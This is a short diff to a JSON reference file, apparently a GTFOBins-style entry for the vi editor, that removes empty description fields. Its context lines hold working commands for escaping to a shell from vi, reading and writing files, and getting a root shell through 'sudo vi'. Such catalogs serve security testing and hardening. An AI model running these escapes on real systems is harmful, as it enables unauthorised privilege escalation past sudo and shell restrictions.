@@ -2,29 +2,29 @@
   "functions": {
     "shell": [
       {
-        "description": "",
+        
         "code": "vi -c ':!/bin/sh' /dev/null\n"
       },
       {
-        "description": "",
+        
         "code": "vi\n:set shell=/bin/sh\n:shell\n"
       }
     ],
     "file-write": [
       {
-        "description": "",
+        
         "code": "vi file_to_write\niDATA\n^[\nw\n"
       }
     ],
     "file-read": [
       {
-        "description": "",
+        
         "code": "vi file_to_read\n"
       }
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "sudo vi -c ':!/bin/sh' /dev/null\n"
       }
     ]
